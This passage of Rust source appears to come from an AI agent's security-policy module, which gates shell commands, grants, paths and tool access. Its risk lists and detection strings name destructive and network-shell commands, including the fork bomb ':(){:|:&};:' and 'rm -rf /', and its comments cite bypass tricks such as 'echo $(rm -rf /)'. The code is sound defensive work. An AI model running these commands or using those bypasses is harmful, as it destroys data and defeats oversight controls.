    ) -> Result<ResourceRiskLevel, String> {
        // P3-10: bound gate re-entrancy depth (see authorize_command_execution).
        let _depth_guard = GateDepthGuard::enter();
        if GateDepthGuard::current_depth() > MAX_GATE_DEPTH {
            return Err(format!(
                "side-effect gate re-entrancy depth exceeded (max {MAX_GATE_DEPTH})"
            ));
        }
        let mut allowed = false;
        let mut approved = false;
        let result = (|| {
            self.policy.enforce_tool_operation(ToolOperation::Act, operation_name)?;

            // Permission-model Phase 1: `full` authorizes every resource op
            // unconditionally; `supervised` requires a runtime grant for
            // medium/high-risk ops; `read_only` was already rejected by
            // `enforce_tool_operation` above.
            if matches!(risk, ResourceRiskLevel::Medium | ResourceRiskLevel::High)
                && self.policy.autonomy == AutonomyLevel::Supervised
            {
                let now = chrono::Utc::now().timestamp();
                approved =
                    grant.is_some_and(|grant| grant.permits_resource_operation(tool_name, operation_name, risk, now));
                if !approved {
                    // Redact secrets before operation_name lands in a propagating
                    // error string (can reach stderr / caller logs).
                    return Err(format!(
                        "Resource operation requires runtime approval grant: {}",
                        redact_secrets(operation_name)
                    ));
                }
            }

            allowed = true;
            Ok(risk)
        })();
        // M5 replay defense (mirrors the command path): consume one use of the
        // authorizing v2 grant exactly once on the real allow path. If exhausted,
        // flip to Deny.
        let mut result = result;
        if result.is_ok() && approved {
            if let Some((grant_id, max_uses)) = grant.and_then(ApprovalGrant::v2_single_use_key) {
                if !try_consume_v2_grant(grant_id, max_uses) {
                    allowed = false;
                    result = Err("approval grant single-use exhausted (replay)".to_string());
                }
            }
        }
        let risk_label = format!("{risk:?}").to_ascii_lowercase();
        // Compliance audit (EU AI Act Art.12): same field set + precise
        // deny-reason preference as the command path above.
        let now = chrono::Utc::now().timestamp();
        let grant_deny_reason = match (result.as_ref(), grant) {
            (Err(_), Some(grant)) => grant.resource_deny_reason(tool_name, operation_name, risk, now),
            _ => None,
        };
        let audit_reason = grant_deny_reason
            .as_deref()
            .or_else(|| result.as_ref().err().map(String::as_str));
        crate::security::audit::record_side_effect_decision_best_effort(
            &self.policy.workspace_dir,
            &self.policy.audit_config,
            crate::security::audit::SideEffectDecisionLog {
                tool_name,
                operation_name,
                risk_level: &risk_label,
                approved,
                allowed,
                error: audit_reason,
                principal_id: grant.and_then(ApprovalGrant::audit_principal_id),
                grant_id: grant.and_then(ApprovalGrant::audit_grant_id),
            },
        );
        result
    }
}

#[must_use]
pub fn command_operation_hash(tool_name: &str, command: &str) -> u64 {
    let mut hasher = sha2::Sha256::new();
    sha2::Digest::update(&mut hasher, tool_name.as_bytes());
    sha2::Digest::update(&mut hasher, b"\0");
    sha2::Digest::update(&mut hasher, command.as_bytes());
    let digest = sha2::Digest::finalize(hasher);
    let mut first = [0_u8; 8];
    for (slot, byte) in first.iter_mut().zip(digest.iter().take(8)) {
        *slot = *byte;
    }
    u64::from_be_bytes(first)
}

/// P3-07: full 256-bit SHA-256 hex digest binding `tool_name` + `command`.
/// Domain-separated identically to [`command_operation_hash`] (`tool\0command`)
/// so the v1 and v2 digests cover the same input; only the output width differs.
#[must_use]
pub fn command_operation_hash_v2(tool_name: &str, command: &str) -> String {
    let mut hasher = sha2::Sha256::new();
    sha2::Digest::update(&mut hasher, tool_name.as_bytes());
    sha2::Digest::update(&mut hasher, b"\0");
    sha2::Digest::update(&mut hasher, command.as_bytes());
    let digest = sha2::Digest::finalize(hasher);
    let mut hex = String::with_capacity(digest.len() * 2);
    for byte in digest {
        use std::fmt::Write as _;
        // Writing a byte to a String via fmt::Write is infallible; the Result is
        // intentionally discarded because String's writer never errors.
        let _ = write!(hex, "{byte:02x}");
    }
    hex
}

/// P3-07: 256-bit SHA-256 hex digest for resource operations. Mirrors
/// [`resource_operation_hash`] by delegating to [`command_operation_hash_v2`].
#[must_use]
pub fn resource_operation_hash_v2(tool_name: &str, operation_name: &str) -> String {
    command_operation_hash_v2(tool_name, operation_name)
}

#[must_use]
pub fn resource_operation_hash(tool_name: &str, operation_name: &str) -> u64 {
    command_operation_hash(tool_name, operation_name)
}

/// Sliding-window action tracker for rate limiting.
#[derive(Debug)]
pub struct ActionTracker {
    /// Timestamps of recent actions (kept within the last hour).
    actions: Mutex<Vec<Instant>>,
}

impl ActionTracker {
    pub const fn new() -> Self {
        Self {
            actions: Mutex::new(Vec::new()),
        }
    }

    /// Record an action and return the current count within the window.
    pub fn record(&self) -> usize {
        let mut actions = self.actions.lock();
        let cutoff = Instant::now()
            .checked_sub(std::time::Duration::from_secs(3600))
            .unwrap_or_else(Instant::now);
        actions.retain(|t| *t > cutoff);
        actions.push(Instant::now());
        actions.len()
    }

    /// Count of actions in the current window without recording.
    pub fn count(&self) -> usize {
        let mut actions = self.actions.lock();
        let cutoff = Instant::now()
            .checked_sub(std::time::Duration::from_secs(3600))
            .unwrap_or_else(Instant::now);
        actions.retain(|t| *t > cutoff);
        actions.len()
    }
}

impl Clone for ActionTracker {
    fn clone(&self) -> Self {
        let actions = self.actions.lock();
        Self {
            actions: Mutex::new(actions.clone()),
        }
    }
}

/// Security policy enforced on all tool executions
#[derive(Debug, Clone)]
pub struct SecurityPolicy {
    pub autonomy: AutonomyLevel,
    pub workspace_dir: PathBuf,
    pub workspace_only: bool,
    pub forbidden_paths: Vec<String>,
    pub max_actions_per_hour: u32,
    pub max_cost_per_day_cents: u32,
    pub tracker: ActionTracker,
    /// Scope-based per-user/channel/chat_type tool access rules.
    pub scope_rules: Vec<crate::config::ScopeRule>,
    /// Default action when no scope rule matches: true = allow, false = deny.
    pub scope_default_allow: bool,
    /// FIX-P1-31: audit configuration governing the side-effect gate's audit
    /// trail. When `enabled=false` the gate's best-effort audit hook writes
    /// nothing and performs no `fsync`, so a user who disables `security.audit`
    /// actually pays no audit cost. Defaults to [`AuditConfig::default`]
    /// (`enabled=true`) to preserve the historical always-on behaviour.
    pub audit_config: crate::config::AuditConfig,
}

impl Default for SecurityPolicy {
    fn default() -> Self {
        Self::from_config(&crate::config::AutonomyConfig::default(), Path::new("."))
    }
}

// ── Shell Command Parsing Utilities ───────────────────────────────────────
// These helpers implement a minimal quote-aware shell lexer. They exist
// because security validation must reason about the *structure* of a
// command (separators, operators, quoting) rather than treating it as a
// flat string — otherwise an attacker could hide dangerous sub-commands
// inside quoted arguments or chained operators.
/// Skip leading environment variable assignments (e.g. `FOO=bar cmd args`).
/// Returns the remainder starting at the first non-assignment word.
fn skip_env_assignments(s: &str) -> &str {
    let mut rest = s;
    loop {
        let Some(word) = rest.split_whitespace().next() else {
            return rest;
        };
        // Environment assignment: contains '=' and starts with a letter or underscore
        if word.contains('=') && word.chars().next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_') {
            // Advance past this word
            rest = rest[word.len()..].trim_start();
        } else {
            return rest;
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum QuoteState {
    None,
    Single,
    Double,
}

/// Apply POSIX shell line continuation before policy parsing.
///
/// An unquoted or double-quoted, unescaped backslash immediately followed by
/// LF or CRLF removes both the final backslash and the physical line ending.
/// Single-quoted content is literal. Counting each consecutive backslash run
/// is important: only an odd run leaves a final backslash that escapes the line
/// ending; an even run leaves the line ending intact as a command separator.
fn fold_shell_line_continuations(command: &str) -> String {
    let chars = command.chars().collect::<Vec<_>>();
    let mut folded = String::with_capacity(command.len());
    let mut quote = QuoteState::None;
    let mut index = 0;

    while index < chars.len() {
        let Some(ch) = chars.get(index).copied() else {
            break;
        };
        if quote == QuoteState::Single {
            folded.push(ch);
            if ch == '\'' {
                quote = QuoteState::None;
            }
            index += 1;
            continue;
        }

        if ch == '\\' {
            let run_start = index;
            while chars.get(index).is_some_and(|character| *character == '\\') {
                index += 1;
            }
            let run_length = index - run_start;
            let line_ending_length = match chars.get(index..) {
                Some(['\r', '\n', ..]) => 2,
                Some(['\n', ..]) => 1,
                _ => 0,
            };
            if line_ending_length != 0 && run_length % 2 == 1 {
                folded.extend(std::iter::repeat_n('\\', run_length - 1));
                index += line_ending_length;
                continue;
            }

            folded.extend(std::iter::repeat_n('\\', run_length));
            if run_length % 2 == 1
                && let Some(escaped_character) = chars.get(index).copied()
            {
                // The following character is escaped, so it cannot transition
                // the quote state even when it is a quote delimiter.
                folded.push(escaped_character);
                index += 1;
            }
            continue;
        }

        folded.push(ch);
        match (quote, ch) {
            (QuoteState::None, '\'') => quote = QuoteState::Single,
            (QuoteState::None, '"') => quote = QuoteState::Double,
            (QuoteState::Double, '"') => quote = QuoteState::None,
            _ => {}
        }
        index += 1;
    }

    folded
}

/// Split a shell command into sub-commands by unquoted separators.
///
/// Separators:
/// - `;` and newline
/// - `|`
/// - `&&`, `||`
///
/// Characters inside single or double quotes are treated as literals, so
/// `sqlite3 db "SELECT 1; SELECT 2;"` remains a single segment.
fn split_unquoted_segments(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut quote = QuoteState::None;
    let mut escaped = false;
    let mut chars = command.chars().peekable();

    let push_segment = |segments: &mut Vec<String>, current: &mut String| {
        let trimmed = current.trim();
        if !trimmed.is_empty() {
            segments.push(trimmed.to_string());
        }
        current.clear();
    };

    while let Some(ch) = chars.next() {
        match quote {
            QuoteState::Single => {
                if ch == '\'' {
                    quote = QuoteState::None;
                }
                current.push(ch);
            }
            QuoteState::Double => {
                if escaped {
                    escaped = false;
                    current.push(ch);
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    current.push(ch);
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                }
                current.push(ch);
            }
            QuoteState::None => {
                if escaped {
                    escaped = false;
                    current.push(ch);
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    current.push(ch);
                    continue;
                }

                match ch {
                    '\'' => {
                        quote = QuoteState::Single;
                        current.push(ch);
                    }
                    '"' => {
                        quote = QuoteState::Double;
                        current.push(ch);
                    }
                    ';' | '\n' => push_segment(&mut segments, &mut current),
                    '|' => {
                        if chars.next_if_eq(&'|').is_some() {
                            // Consume full `||`; both characters are separators.
                        }
                        push_segment(&mut segments, &mut current);
                    }
                    '&' => {
                        if chars.next_if_eq(&'&').is_some() {
                            // `&&` is a separator; single `&` is handled separately.
                            push_segment(&mut segments, &mut current);
                        } else {
                            current.push(ch);
                        }
                    }
                    _ => current.push(ch),
                }
            }
        }
    }

    let trimmed = current.trim();
    if !trimmed.is_empty() {
        segments.push(trimmed.to_string());
    }

    segments
}

/// Detect a single unquoted `&` operator (background/chain). `&&` is allowed.
///
/// We treat any standalone `&` as unsafe in policy validation because it can
/// chain hidden sub-commands and escape foreground timeout expectations.
fn contains_unquoted_single_ampersand(command: &str) -> bool {
    let mut quote = QuoteState::None;
    let mut escaped = false;
    let mut chars = command.chars().peekable();

    while let Some(ch) = chars.next() {
        match quote {
            QuoteState::Single => {
                if ch == '\'' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::Double => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::None => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                match ch {
                    '\'' => quote = QuoteState::Single,
                    '"' => quote = QuoteState::Double,
                    '&' => {
                        if chars.next_if_eq(&'&').is_none() {
                            return true;
                        }
                    }
                    _ => {}
                }
            }
        }
    }

    false
}

/// Detect an unquoted character in a shell command.
fn contains_unquoted_char(command: &str, target: char) -> bool {
    let mut quote = QuoteState::None;
    let mut escaped = false;

    for ch in command.chars() {
        match quote {
            QuoteState::Single => {
                if ch == '\'' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::Double => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                    continue;
                }
            }
            QuoteState::None => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                match ch {
                    '\'' => quote = QuoteState::Single,
                    '"' => quote = QuoteState::Double,
                    _ if ch == target => return true,
                    _ => {}
                }
            }
        }
    }

    false
}

impl SecurityPolicy {
    // ── Risk Classification ──────────────────────────────────────────────
    // Risk is assessed per-segment (split on shell operators), and the
    // highest risk across all segments wins. This prevents bypasses like
    // `ls && rm -rf /` from being classified as Low just because `ls` is safe.

    /// Classify command risk. Any high-risk segment marks the whole command high.
    pub fn command_risk_level(&self, command: &str) -> CommandRiskLevel {
        let folded_command = fold_shell_line_continuations(command);
        let mut saw_medium = false;

        for segment in split_unquoted_segments(&folded_command) {
            let cmd_part = skip_env_assignments(&segment);
            let mut words = cmd_part.split_whitespace();
            let Some(base_raw) = words.next() else {
                continue;
            };

            let base = base_raw.rsplit('/').next().unwrap_or("").to_ascii_lowercase();

            let args: Vec<String> = words.map(|w| w.to_ascii_lowercase()).collect();
            let joined_segment = cmd_part.to_ascii_lowercase();

            // High-risk commands
            if matches!(
                base.as_str(),
                "rm" | "mkfs"
                    | "dd"
                    | "shutdown"
                    | "reboot"
                    | "halt"
                    | "poweroff"
                    | "sudo"
                    | "su"
                    | "chown"
                    | "chmod"
                    | "useradd"
                    | "userdel"
                    | "usermod"
                    | "passwd"
                    | "mount"
                    | "umount"
                    | "iptables"
                    | "ufw"
                    | "firewall-cmd"
                    | "curl"
                    | "wget"
                    | "nc"
                    | "ncat"
                    | "netcat"
                    | "scp"
                    | "ssh"
                    | "ftp"
                    | "telnet"
            ) {
                return CommandRiskLevel::High;
            }

            if joined_segment.contains("rm -rf /")
                || joined_segment.contains("rm -fr /")
                || joined_segment.contains(":(){:|:&};:")
            {
                return CommandRiskLevel::High;
            }

            // Medium-risk commands (state-changing, but not inherently destructive)
            let medium = match base.as_str() {
                "git" => args.first().is_some_and(|verb| {
                    matches!(
                        verb.as_str(),
                        "commit"
                            | "push"
                            | "reset"
                            | "clean"
                            | "rebase"
                            | "merge"
                            | "cherry-pick"
                            | "revert"
                            | "branch"
                            | "checkout"
                            | "switch"
                            | "tag"
                    )
                }),
                "npm" | "pnpm" | "yarn" => args.first().is_some_and(|verb| {
                    matches!(
                        verb.as_str(),
                        "install" | "add" | "remove" | "uninstall" | "update" | "publish"
                    )
                }),
                "cargo" => args
                    .first()
                    .is_some_and(|verb| matches!(verb.as_str(), "add" | "remove" | "install" | "clean" | "publish")),
                "touch" | "mkdir" | "mv" | "cp" | "ln" => true,
                _ => false,
            };

            saw_medium |= medium;
        }

        if saw_medium {
            CommandRiskLevel::Medium
        } else {
            CommandRiskLevel::Low
        }
    }

    // ── Command Execution Policy Gate ──────────────────────────────────────
    // Permission-model Phase 1 semantics (governed solely by autonomy level):
    //   * `read_only` → all commands denied (structural gate below + `decide`).
    //   * `full`      → every command authorized; no allowlist, no risk block.
    //   * `supervised`→ medium/high-risk commands require a runtime approval
    //                   grant (issued via the `decide → Ask → grant` path); low
    //                   risk runs freely.
    // `command_risk_level` is retained for Phase 2 risk grading; in Phase 1 it
    // only chooses whether supervised needs a grant.

    /// Validate full command execution policy under the active autonomy level.
    pub fn validate_command_execution(
        &self,
        command: &str,
        runtime_approval_granted: bool,
    ) -> Result<CommandRiskLevel, String> {
        if let Some(violation) = forbidden_path_argument(self, command) {
            return Err(match violation {
                CommandPathViolation::Forbidden(path) => format!("forbidden path argument: {path}"),
                CommandPathViolation::Dynamic(token) => format!("forbidden dynamic path argument: {token}"),
                CommandPathViolation::ActiveSubstitution => "forbidden active shell substitution".to_string(),
            });
        }

        if !self.is_command_allowed(command) {
            // Redact secrets before the raw command lands in an error string that
            // can propagate (via `?`) all the way to stderr / caller logs.
            return Err(format!(
                "Command not allowed by security policy: {}",
                redact_secrets(command)
            ));
        }

        let risk = self.command_risk_level(command);

        // Full autonomy bypasses approval risk grading, but workspace path
        // boundaries above remain a shared invariant for every shell entry.
        if self.autonomy == AutonomyLevel::Full {
            return Ok(risk);
        }

        // Supervised: medium/high-risk commands require an explicit runtime grant.
        if matches!(risk, CommandRiskLevel::Medium | CommandRiskLevel::High)
            && self.autonomy == AutonomyLevel::Supervised
            && !runtime_approval_granted
        {
            return Err("Command requires runtime approval grant: risky operation".into());
        }

        Ok(risk)
    }

    // ── Layered Command Allowlist ──────────────────────────────────────────
    // Defence-in-depth: five independent gates run in order before the
    // per-segment allowlist check. Each gate targets a specific bypass
    // technique. If any gate rejects, the whole command is blocked.

    /// Check if a shell command is allowed.
    ///
    /// Validates the **entire** command string, not just the first word:
    /// - Blocks subshell operators (`` ` ``, `$(`) that hide arbitrary execution
    /// - Splits on command separators (`|`, `&&`, `||`, `;`, newlines) and
    ///   validates each sub-command against the allowlist
    /// - Blocks single `&` background chaining (`&&` remains supported)
    /// - Blocks output redirections (`>`, `>>`) that could write outside workspace
    /// - Blocks dangerous arguments (e.g. `find -exec`, `git config`)
    pub fn is_command_allowed(&self, command: &str) -> bool {
        let folded_command = fold_shell_line_continuations(command);
        let command = folded_command.as_str();
        if self.autonomy == AutonomyLevel::ReadOnly {
            return false;
        }

        // In full autonomy mode, allow subshell/expansion and redirections
        if self.autonomy != AutonomyLevel::Full {
            // Block subshell/expansion operators — these allow hiding arbitrary
            // commands inside an allowed command (e.g. `echo $(rm -rf /)`)
            if contains_active_shell_substitution(command) {
                return false;
            }

            // Block output redirections (`>`, `>>`) — they can write to arbitrary paths.
            // Ignore quoted literals, e.g. `echo "a>b"`.
            if contains_unquoted_char(command, '>') {
                return false;
            }
        }

        if self.autonomy != AutonomyLevel::Full {
            // Block `tee` — it can write to arbitrary files, bypassing the
            // redirect check above (e.g. `echo secret | tee /etc/crontab`)
            if command.split_whitespace().any(|w| w == "tee" || w.ends_with("/tee")) {
                return false;
            }

            // Block background command chaining (`&`), which can hide extra
            // sub-commands and outlive timeout expectations. Keep `&&` allowed.
            if contains_unquoted_single_ampersand(command) {
                return false;
            }
        }

        // Split on unquoted command separators and validate each sub-command.
        let segments = split_unquoted_segments(command);
        for segment in &segments {
            // Strip leading env var assignments (e.g. FOO=bar cmd)
            let cmd_part = skip_env_assignments(segment);

            let mut words = cmd_part.split_whitespace();
            let base_raw = words.next().unwrap_or("");
            let base_cmd = base_raw.rsplit('/').next().unwrap_or("");

            if base_cmd.is_empty() {
                continue;
            }

            // Permission-model Phase 1: the per-command allowlist was removed; the
            // base command is no longer gated here. Structural safety (subshell /
            // redirection / dangerous args) below still applies to non-full modes,
            // and supervised risk gating happens in `validate_command_execution`.

            // Validate arguments for the command unless full autonomy is selected.
            // In full mode, argument-level safety gates are intentionally disabled.
            if self.autonomy != AutonomyLevel::Full {
                let args: Vec<String> = words.map(|w| w.to_ascii_lowercase()).collect();
                if !self.is_args_safe(base_cmd, &args) {
                    return false;
                }
            }
        }

        // At least one command must be present
        segments.iter().any(|s| {
            let s = skip_env_assignments(s.trim());
            s.split_whitespace().next().is_some_and(|w| !w.is_empty())
        })
    }

    /// Check for dangerous arguments that allow sub-command execution.
    fn is_args_safe(&self, base: &str, args: &[String]) -> bool {
        let base = base.to_ascii_lowercase();
        match base.as_str() {
            "find" => {
                // find -exec and find -ok allow arbitrary command execution
                !args.iter().any(|arg| arg == "-exec" || arg == "-ok")
            }
            "git" => {
                // git config, alias, and -c can be used to set dangerous options
                // (e.g. git config core.editor "rm -rf /")
                !args.iter().any(|arg| {
                    arg == "config"
                        || arg.starts_with("config.")
                        || arg == "alias"
                        || arg.starts_with("alias.")
                        || arg == "-c"
                })
            }
            _ => true,
        }
    }

    // ── Path Validation ────────────────────────────────────────────────
    // Layered checks: null-byte injection → component-level traversal →
    // URL-encoded traversal → tilde expansion → absolute-path block →
    // forbidden-prefix match. Each layer addresses a distinct escape
    // technique; together they enforce workspace confinement.

    /// Check if a file path is allowed (no path traversal, within workspace)
    pub fn is_path_allowed(&self, path: &str) -> bool {
        // Block null bytes (can truncate paths in C-backed syscalls)
        if path.contains('\0') {
            return false;
        }

        // Block path traversal: check for ".." as a path component
        if Path::new(path)
            .components()
            .any(|c| matches!(c, std::path::Component::ParentDir))
        {
            return false;
        }

        // Block URL-encoded traversal attempts (e.g. ..%2f)
        let lower = path.to_lowercase();
        if lower.contains("..%2f") || lower.contains("%2f..") {
            return false;
        }

        // Expand tilde for comparison
        let expanded = path.strip_prefix("~/").map_or_else(
            || path.to_string(),
            |stripped| {
                std::env::var("HOME").ok().map(PathBuf::from).map_or_else(
                    || path.to_string(),
                    |home| home.join(stripped).to_string_lossy().to_string(),
                )
            },
        );

        // Block absolute paths when workspace_only is set
        if self.workspace_only && Path::new(&expanded).is_absolute() {
            return false;
        }

        // Block forbidden paths using path-component-aware matching
        let expanded_path = Path::new(&expanded);
        for forbidden in &self.forbidden_paths {
            let forbidden_expanded = forbidden.strip_prefix("~/").map_or_else(
                || forbidden.clone(),
                |stripped| {
                    std::env::var("HOME").ok().map(PathBuf::from).map_or_else(
                        || forbidden.clone(),
                        |home| home.join(stripped).to_string_lossy().to_string(),
                    )
                },
            );
            let forbidden_path = Path::new(&forbidden_expanded);
            if expanded_path.starts_with(forbidden_path) {
                return false;
            }
        }

        true
    }

    /// Validate that a resolved path is still inside the workspace.
    /// Call this AFTER joining `workspace_dir` + relative path and canonicalizing.
    pub fn is_resolved_path_allowed(&self, resolved: &Path) -> bool {
        if !self.workspace_only {
            return true;
        }

        // Must be under workspace_dir (prevents symlink escapes).
        // Prefer canonical workspace root so `/a/../b` style config paths don't
        // cause false positives or negatives.
        let workspace_root = self
            .workspace_dir
            .canonicalize()
            .unwrap_or_else(|_| self.workspace_dir.clone());
        resolved.starts_with(workspace_root)
    }

    /// Check if autonomy level permits any action at all
    pub fn can_act(&self) -> bool {
        self.autonomy != AutonomyLevel::ReadOnly
    }

    // ── Tool Operation Gating ──────────────────────────────────────────────
    // Read operations bypass autonomy and rate checks because they have
    // no side effects. Act operations must pass both the autonomy gate
    // (not read-only) and the sliding-window rate limiter.

    /// Enforce policy for a tool operation.
    ///
    /// Read operations are always allowed by autonomy/rate gates.
    /// Act operations require non-readonly autonomy and available action budget.
    pub fn enforce_tool_operation(&self, operation: ToolOperation, operation_name: &str) -> Result<(), String> {
        match operation {
            ToolOperation::Read => Ok(()),
            ToolOperation::Act => {
                if !self.can_act() {
                    // operation_name can embed raw command args / credentials; redact
                    // before it lands in an error string that can reach stderr.
                    return Err(format!(
                        "Security policy: read-only mode, cannot perform '{}'",
                        redact_secrets(operation_name)
                    ));
                }

                if !self.record_action() {
                    return Err("Rate limit exceeded: action budget exhausted".to_string());
                }

                Ok(())
            }
        }
    }

    /// Record an action and check if the rate limit has been exceeded.
    /// Returns `true` if the action is allowed, `false` if rate-limited.
    pub fn record_action(&self) -> bool {
        let count = self.tracker.record();
        count <= self.max_actions_per_hour as usize
    }

    /// Check if the rate limit would be exceeded without recording.
    pub fn is_rate_limited(&self) -> bool {
        self.tracker.count() >= self.max_actions_per_hour as usize
    }

    /// Build from config sections
    pub fn from_config(autonomy_config: &crate::config::AutonomyConfig, workspace_dir: &Path) -> Self {
        Self {
            autonomy: autonomy_config.level,
            workspace_dir: workspace_dir.to_path_buf(),
            workspace_only: autonomy_config.workspace_only,
            forbidden_paths: autonomy_config.forbidden_paths.clone(),
            max_actions_per_hour: autonomy_config.max_actions_per_hour,
            max_cost_per_day_cents: autonomy_config.max_cost_per_day_cents,
            tracker: ActionTracker::new(),
            scope_rules: autonomy_config.scopes.rules.clone(),
            scope_default_allow: autonomy_config.scopes.default.to_lowercase() != "deny",
            // Default audit config; callers that have the real `security.audit`
            // block attach it via [`Self::with_audit_config`] so the gate audit
            // path honours `enabled`/`log_path`/`max_size_mb`.
            audit_config: crate::config::AuditConfig::default(),
        }
    }

    /// FIX-P1-31: attach the user-configured `security.audit` block so the
    /// side-effect gate's audit trail respects it (notably `enabled=false`,
    /// which then skips both the write and the synchronous `fsync`).
    #[must_use]
    pub fn with_audit_config(mut self, audit_config: crate::config::AuditConfig) -> Self {
        self.audit_config = audit_config;
        self
    }

    /// Check whether a specific tool is allowed for the given request context.
    ///
    /// Evaluation order:
    /// 1. If autonomy is `ReadOnly`, block all write/action tools (all tools considered "action").
    /// 2. Evaluate scope rules top-to-bottom; use first matching rule.
    /// 3. Within a matching rule: deny list takes priority, then allow list (empty = all permitted).
    /// 4. If no rule matches, apply `scope_default_allow`.
    ///
    /// A rule matches when ALL specified criteria match the provided context.
    /// A criterion is skipped (treated as matching) when not specified in the rule.
    pub fn is_tool_allowed(&self, tool_name: &str, sender: &str, channel: &str, chat_type: &str) -> bool {
        // ReadOnly blocks all tools unconditionally via can_act(); scope check is layered on top.
        // We don't double-block here — let can_act() handle ReadOnly separately.

        // Walk rules in order; return on first match.
        for rule in &self.scope_rules {
            if !rule_matches(rule, sender, channel, chat_type) {
                continue;
            }
            // Rule matched — apply deny first, then allow.
            if rule.tools_deny.iter().any(|d| d == tool_name || d == "*") {
                return false;
            }
            if rule.tools_allow.is_empty() {
                // No allow-list restriction; this rule permits everything not denied.
                return true;
            }
            return rule.tools_allow.iter().any(|a| a == tool_name || a == "*");
        }

        // No rule matched — use default.
        self.scope_default_allow
    }

    /// Unified tool-authorization decision point (permission-model Phase 1).
    ///
    /// This is the single entry point that replaces the former scattered
    /// authorization logic. Evaluation order:
    ///
    /// 1. **Identity scope ACL** — [`is_tool_allowed`](Self::is_tool_allowed)
    ///    (per user / channel / chat_type). A scope denial is `Deny`,
    ///    independent of autonomy level.
    /// 2. **Autonomy level**:
    ///    * `full`        → `Allow` (全放行; no prompt, no grant).
    ///    * `read_only`   → read-only tools `Allow`, everything else `Deny`.
    ///    * `supervised`  → read-only tools `Allow`, everything else `Ask`
    ///      (routes through `ApprovalManager` + `ApprovalGrantV2`).
    ///
    /// The non-CLI-channel fail-closed behaviour (an `Ask` with no approval
    /// resolver becomes a `Deny`) is enforced at the call site in the tool-call
    /// loop, not here.
    #[must_use]
    pub fn decide(&self, tool_name: &str, sender: &str, channel: &str, chat_type: &str) -> ToolDecision {
        // 1. Identity scope ACL — independent of autonomy level.
        if !self.is_tool_allowed(tool_name, sender, channel, chat_type) {
            return ToolDecision::Deny;
        }

        // Read-only tools are always allowed (no side effects).
        if is_read_only_tool(tool_name) {
            return ToolDecision::Allow;
        }

        // 2. Autonomy level governs side-effecting tools.
        match self.autonomy {
            AutonomyLevel::Full => ToolDecision::Allow,
            AutonomyLevel::ReadOnly => ToolDecision::Deny,
            AutonomyLevel::Supervised => ToolDecision::Ask,
        }
    }
}

/// Check whether a scope rule's criteria match the given request context.
/// A criterion is skipped (matches anything) when not specified (`None`).
fn rule_matches(rule: &crate::config::ScopeRule, sender: &str, channel: &str, chat_type: &str) -> bool {
    if let Some(ref user_pattern) = rule.user {
        if user_pattern != "*" && user_pattern != sender {
            return false;
        }
    }
    if let Some(ref ch_pattern) = rule.channel {
        if ch_pattern != "*" && ch_pattern != channel {
            return false;
        }
    }
    if let Some(ref ct_pattern) = rule.chat_type {
        if ct_pattern != "*" && ct_pattern != chat_type {
            return false;
        }
    }
    true
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Utc;
    use serde_json::json;

    /// Install (once) an in-memory process-global witness keyring so the
    /// production gate path (`WitnessKeyring::global()`) verifies against the
    /// same key the test signs with — no `$HOME`, filesystem, or `unsafe` env
    /// mutation. Returns that keyring.
    fn global_keyring_guard() -> &'static crate::acl::approval_grant::WitnessKeyring {
        crate::acl::approval_grant::WitnessKeyring::global_for_tests()
    }

    fn default_policy() -> SecurityPolicy {
        SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        }
    }

    fn readonly_policy() -> SecurityPolicy {
        SecurityPolicy {
            autonomy: AutonomyLevel::ReadOnly,
            ..SecurityPolicy::default()
        }
    }

    fn full_policy() -> SecurityPolicy {
        SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            ..SecurityPolicy::default()
        }
    }

    // ── AutonomyLevel ────────────────────────────────────────

    #[test]
    fn autonomy_default_is_full() {
        assert_eq!(AutonomyLevel::default(), AutonomyLevel::Full);
    }

    #[test]
    fn autonomy_serde_roundtrip() {
        let json = serde_json::to_string(&AutonomyLevel::Full).unwrap();
        assert_eq!(json, "\"full\"");
        let parsed: AutonomyLevel = serde_json::from_str("\"readonly\"").unwrap();
        assert_eq!(parsed, AutonomyLevel::ReadOnly);
        let parsed2: AutonomyLevel = serde_json::from_str("\"supervised\"").unwrap();
        assert_eq!(parsed2, AutonomyLevel::Supervised);
    }

    #[test]
    fn can_act_readonly_false() {
        assert!(!readonly_policy().can_act());
    }

    #[test]
    fn can_act_supervised_true() {
        assert!(default_policy().can_act());
    }

    #[test]
    fn can_act_full_true() {
        assert!(full_policy().can_act());
    }

    #[test]
    fn enforce_tool_operation_read_allowed_in_readonly_mode() {
        let p = readonly_policy();
        assert!(p.enforce_tool_operation(ToolOperation::Read, "memory_recall").is_ok());
    }

    #[test]
    fn enforce_tool_operation_act_blocked_in_readonly_mode() {
        let p = readonly_policy();
        let err = p
            .enforce_tool_operation(ToolOperation::Act, "memory_store")
            .unwrap_err();
        assert!(err.contains("read-only mode"));
    }

    #[test]
    fn enforce_tool_operation_redacts_secrets_in_readonly_error() {
        // BUG-D1-02: the read-only deny reason embeds the operation_name, which
        // can carry credentials. The returned Err must not leak the plaintext.
        let p = readonly_policy();
        let err = p
            .enforce_tool_operation(ToolOperation::Act, "memory_store --password=topsecret")
            .unwrap_err();
        assert!(err.contains("read-only mode"));
        assert!(
            !err.contains("topsecret"),
            "secret must be redacted in policy error: {err}"
        );
        assert!(err.contains("[REDACTED]"));
    }

    #[test]
    fn authorize_command_execution_redacts_secrets_in_disallowed_error() {
        // BUG-D1-02: a command rejected by the policy surfaces the raw command
